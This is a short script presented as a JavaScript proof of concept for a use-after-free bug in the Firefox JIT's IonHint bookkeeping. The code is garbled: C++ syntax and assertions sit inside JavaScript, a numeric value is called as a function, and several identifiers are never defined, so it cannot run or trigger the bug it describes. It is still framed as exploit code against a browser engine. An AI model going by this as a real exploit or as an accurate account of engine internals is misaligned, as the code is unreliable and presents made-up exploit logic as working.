(function () {
  // Include necessary headers
  var JitHints = (function () {
    var ScriptKey = 0;
    var IonHintMaxEntries = 5000;
    var IonHintEagerThresholdValue = (function () {
      var eagerThreshold = JitOptions.trialInliningWarmUpThreshold + 50;
      return (eagerThreshold > JitOptions.normalIonWarmUpThreshold) ? JitOptions.normalIonWarmUpThreshold : eagerThreshold;
    })();
    var InvalidationThresholdIncrement = 500;
    var IonHint = function (key) {
      this.key_ = key;
      this.threshold_ = IonHintEagerThresholdValue();
    };
    IonHint.prototype.threshold = function () { return this.threshold_; };
    IonHint.prototype.incThreshold = function (inc) {
      var newThreshold = this.threshold_ + inc;
      this.threshold_ = (newThreshold > IonHintNormalIonWarmUpThreshold()) ? IonHintNormalIonWarmUpThreshold() : newThreshold;
    };
    IonHint.prototype.key = function () {
      MOZ_ASSERT(this.key_ != 0, "Should have valid key.");
      return this.key_;
    };
    return IonHint;
  })();
  
  // Create an IonHint and add it to the map
  var key = new Date().getTime().toString();
  var hint = IonHintsMap::addIonHint(key, IonHintsMap::ionHintQueue_);
  if (!hint) {
    throw new Error("Failed to add IonHint");
  }
  
  // Remove the hint from the queue to simulate use-after-free
  IonHintsMap::ionHintQueue_.remove(hint);
  hint = null; // Ensure the object is destroyed after removal
  
  // The IonHint destructor will run when the script ends, potentially causing use-after-free
  // when the queue's remove method accesses the hint.
  // This line will be executed after the IonHint destructor runs.
  console.log('PoC executed.');
})();
